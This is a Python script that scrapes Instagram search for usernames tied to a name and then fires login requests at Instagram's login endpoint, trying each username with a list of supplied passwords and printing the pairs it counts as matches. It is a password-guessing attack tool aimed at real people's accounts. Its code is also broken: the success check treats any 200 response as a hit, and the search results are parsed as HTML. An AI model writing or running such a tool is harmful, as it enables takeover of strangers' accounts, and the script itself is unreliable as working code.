import requests
import time
from bs4 import BeautifulSoup

def search_usernames(name):
    url = f"https://www.instagram.com/web/search/topsearch/?context=blended&query={name}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
    }
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.content, "html.parser")
    usernames = []
    for div in soup.find_all("div", class_="fuqBx Nm9FW"):
        a = div.find("a")
        if a:
            usernames.append(a["href"].split("/")[-1])
    return usernames[:20]

def check_passwords(usernames, passwords):
    matched_accounts = []
    for username in usernames:
        for password in passwords:
            url = f"https://www.instagram.com/accounts/login/ajax/"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
            }
            data = {
                "username": username,
                "password": password,
                "queryParams": "eyJvZmZsaW5lX2lkIjoyNjQsImxhYmVsYXVzZV9uYW1lIjoidGVzdF91c2VyIn0%3D",
                "optIntoOneTap": "false"
            }
            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200 and "authenticated":
                matched_accounts.append((username, password))
                print(f"\033[92m{username}\033[0m: \033[92m{password}\033[0m")

            # Add a 1-second delay between requests
            time.sleep(1)

    return matched_accounts

if __name__ == "__main__":
    name = input("Enter a name to search for related Instagram usernames: ")
    usernames = search_usernames(name)
    print(f"Related usernames: {usernames}")
    num_passwords = int(input("Enter the number of passwords to check: "))
    passwords = []
    for i in range(num_passwords):
        password = input(f"Enter password {i+1}: ")
        passwords.append(password)
    matched_accounts = check_passwords(usernames, passwords)
